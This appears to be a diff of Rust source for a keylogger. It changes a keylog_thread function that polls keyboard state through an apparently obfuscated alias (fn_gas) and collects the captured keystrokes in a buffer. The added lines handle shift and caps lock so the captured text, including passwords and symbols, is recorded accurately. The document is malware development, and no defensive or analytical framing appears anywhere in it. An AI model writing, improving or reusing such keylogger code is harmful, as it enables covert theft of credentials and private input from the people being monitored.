@@ -837,11 +837,14 @@ fn keylog_thread() {
 
     let mut prev = [false; 256];
     while KEYLOG_HOOK.load(Ordering::SeqCst) != 0 {
+        let shift     = unsafe { fn_gas(0x10) } as u16 & 0x8000 != 0; // VK_SHIFT
+        let caps_lock = unsafe { fn_gas(0x14) } as u16 & 0x0001 != 0; // VK_CAPITAL toggle state
+        let upper = shift ^ caps_lock;
         for vk in 0u32..=254 {
             let state = unsafe { fn_gas(vk as i32) } as u16;
             let pressed = state & 0x8000 != 0;
             if pressed && !prev[vk as usize] {
-                let ch = vk_to_char(vk);
+                let ch = vk_to_char(vk, upper);
                 if !ch.is_empty() {
                     if let Ok(mut buf) = KEYLOG_BUF.lock() {
                         buf.extend_from_slice(ch.as_bytes());
@@ -854,19 +857,37 @@ fn keylog_thread() {
     }
 }
 
-fn vk_to_char(vk: u32) -> &'static str {
+fn vk_to_char(vk: u32, upper: bool) -> &'static str {
     match vk {
         0x08 => "[BS]", 0x09 => "\t", 0x0D => "\n",
         0x20 => " ", 0x1B => "[ESC]",
         0x25 => "[LEFT]", 0x26 => "[UP]", 0x27 => "[RIGHT]", 0x28 => "[DOWN]",
         0x2E => "[DEL]",
-        0x30..=0x39 => unsafe {
-            static DIGITS: &[u8] = b"0123456789";
-            core::str::from_utf8_unchecked(&DIGITS[(vk - 0x30) as usize..(vk - 0x30) as usize + 1])
+        0x30..=0x39 => if upper {
+            match vk {
+                0x30 => ")", 0x31 => "!", 0x32 => "@", 0x33 => "#",
+                0x34 => "$", 0x35 => "%", 0x36 => "^", 0x37 => "&",
+                0x38 => "*", 0x39 => "(", _ => "",
+            }
+        } else {
+            unsafe {
+                static DIGITS: &[u8] = b"0123456789";
+                core::str::from_utf8_unchecked(&DIGITS[(vk - 0x30) as usize..(vk - 0x30) as usize + 1])
+            }
         },
-        0x41..=0x5A => unsafe {
-            static ALPHA: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
-            core::str::from_utf8_unchecked(&ALPHA[(vk - 0x41) as usize..(vk - 0x41) as usize + 1])
+        0x41..=0x5A => {
+            let idx = (vk - 0x41) as usize;
+            if upper {
+                unsafe {
+                    static UPPER: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+                    core::str::from_utf8_unchecked(&UPPER[idx..idx + 1])
+                }
+            } else {
+                unsafe {
+                    static ALPHA: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
+                    core::str::from_utf8_unchecked(&ALPHA[idx..idx + 1])
+                }
+            }
         },
         _ => "",
     }
